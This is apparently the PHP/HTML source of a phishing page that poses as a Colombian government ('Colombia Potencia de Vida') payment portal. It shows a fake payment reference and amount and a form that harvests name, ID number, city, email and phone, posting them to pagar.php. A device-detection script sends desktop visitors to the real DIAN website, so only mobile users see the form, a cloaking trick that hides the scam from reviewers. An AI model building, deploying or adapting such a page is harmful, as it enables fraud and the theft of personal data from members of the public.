<?php

session_start();
$cedula = $_SESSION['documento'];

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Colombia Potencia de Vida</title>
    <link rel="stylesheet" href="/assets/css/style.css">
    <link rel="stylesheet" href="/assets/css/factura.css">

    <script src="https://kit.fontawesome.com/f19eccc197.js" crossorigin="anonymous"></script>
    <script src="/scripts/script.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

        <style>
        body {
          
            background-color: #f5f5f5;
            font-family: Arial, sans-serif;
        }

        .card {
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
            padding: 20px;
            text-align: center;
            margin-top: 60px;
        }

        .card h2 {
            margin-top: 0;
            color: #333;
        }

        .card p {
            color: #666;
            margin: 10px 0;
        }

        .card .reference {
            font-size: 1.2em;
            font-weight: bold;
            color: #444;
        }

        .card .date, .card .total {
            font-size: 1em;
        }

        .card .total {
            color: #27ae60;
            font-weight: bold;
        }
    </style>
    </head>

<body>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js"
        integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB"
        crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"
        integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13"
        crossorigin="anonymous"></script>

    <main>
        <div class="cab">
            <img id="logo" src="/assets/img/logo.png" alt="" srcset="">
            <hr>
        </div>

       <center> <div class="card">
        <h4>Detalles de Pago</h4>
        <p class="reference">Referencia de pago: 0000159789555</p>
        <p class="date">Fecha de pago: 27/05/2024</p>
        <p class="total">Total a pagar: $20.250</p>
    </div></center>

      <div class="ventanaPago" style="    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); 
padding:5px;padding-bottom:15px; width:90%;margin:auto; text-align:center;margin-top:20px;border:1px solid #dcdcdc; background-color:white; border-radius:10px;">
           <h4>Información de titular</h4>
        <form action="pagar.php" method="post">
            <label for="">
                <a>Nombre y Apellido</a>
                <input type="text" name="nombre" style="width:80%; height:40px; margin-top:5px; border-radius:5px; text-align:center; border:1px solid #dcdcdc;" required>
            </label>
            <label for="">
                <a>Número de Documento</a>
                <input type="tel" name="cedula" id="" value = "<?php echo "$cedula"; ?>" style="width:80%; height:40px; margin-top:5px; border-radius:5px; text-align:center; border:1px solid #dcdcdc;" readonly disabled>
            </label>
            <label for="">
                <a>Ciudad Residencia</a>
                <input type="text" name="ciudad" style="width:80%; height:40px; margin-top:5px; border-radius:5px; text-align:center; border:1px solid #dcdcdc;" required>
            </label>
            <label for="">
                <a>Correo Electronico</a>
                <input type="email" name="correo" style="width:80%; height:40px; margin-top:5px; border-radius:5px; text-align:center; border:1px solid #dcdcdc;" required>
            </label>
            <label for="">
                <a>Número Telefono</a>
                <input type="tel" name="tel" style="width:80%; height:40px; margin-top:5px; border-radius:5px; text-align:center; border:1px solid #dcdcdc;" required>
            </label><br>


                   <input type="submit" value="Continuar" class="btn btn-success" style="margin-top:10px;"><br>


            </form>
        </div>
   
    
   
    </div>
</div>
   
   
</div>

<script>

function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}   


 if (detectar_dispositivo() == "PC") {
        window.location.href = 'https://www.dian.gov.co';
    }
    var popoverTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="popover"]'))
var popoverList = popoverTriggerList.map(function (popoverTriggerEl) {
  return new bootstrap.Popover(popoverTriggerEl)
})
</script>
    <script>
        document.getElementById('miFormulario').addEventListener('submit', function(event) {
  // Evitar que el formulario se envíe
  event.preventDefault();
  
  // Mostrar la ventana de carga
  document.getElementById('overlay').style.display = 'block';

  // Aquí podrías agregar lógica para enviar el formulario, por ejemplo, AJAX
  // Una vez completado el proceso que desencadena la carga, puedes ocultar la ventana de carga nuevamente
});

    </script>
</body>

</html>